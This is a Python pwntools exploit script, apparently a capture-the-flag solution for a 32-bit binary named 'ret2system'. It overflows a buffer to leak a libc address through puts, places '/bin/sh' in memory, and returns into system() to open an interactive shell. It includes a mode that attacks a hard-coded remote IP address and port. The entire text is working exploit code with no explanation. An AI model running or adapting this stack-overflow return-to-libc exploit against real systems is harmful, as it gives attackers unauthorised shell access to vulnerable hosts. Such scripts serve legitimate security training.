#!/usr/bin/env python3
#10-06-2022 Gon
#32bit ret2system

from pwn import *
exe = ELF('./ret2system')
libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)

context.binary = exe
context.log_level='debug'


offset = 107

def conn():
    if args.REMOTE:
        io = remote('34.134.85.196', 9337)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()

payload = flat ({
    offset: [
        exe.plt.puts,
        exe.sym.vuln,
        exe.got.puts
        ]
    })

io.sendlineafter(b'value', payload)
io.recvuntil(b'now\n', drop=True)
if args.REMOTE:
    leak = io.recv(8)
    system = u32(leak[-4:])
else:
    leak = io.recvuntil(b'\n', drop=True)
    puts = u32(leak)
    libc.address = puts - libc.sym.puts
    info("Libc base:%#x", libc.address)
    system = libc.sym.system

io.sendlineafter(b'value', b'/bin/sh\00')

offset = 44
payload = flat ({
    offset: [system,
        0xbeefdead,
        exe.sym.store]
    })

io.sendlineafter(b'now',payload)


io.interactive()
